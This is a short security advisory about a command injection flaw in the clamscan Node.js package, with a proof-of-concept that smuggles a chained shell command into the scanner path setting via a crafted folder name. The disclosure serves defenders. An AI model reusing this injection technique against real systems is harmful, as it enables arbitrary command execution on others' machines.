
Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands as part of the  `_is_clamav_binary`  function located within  `Index.js`.

It should be noted that this vulnerability requires a pre-requisite that a folder should be created with the same command that will be chained to execute. This lowers the risk of this issue.
## POC
```js
var Root = require("clamscan"); 
var fs = require("fs"); 
var attack_code = "echo vulnerable > create.txt"; 
var root = new Root(); 
fs.mkdir(attack_code + "&", function(){}); 
root.init({"clamscan": {'path': attack_code + "&"}});
```


## References

-  [GitHub Permalink #1](https://github.com/kylefarris/clamscan/blob/master/index.js#L34)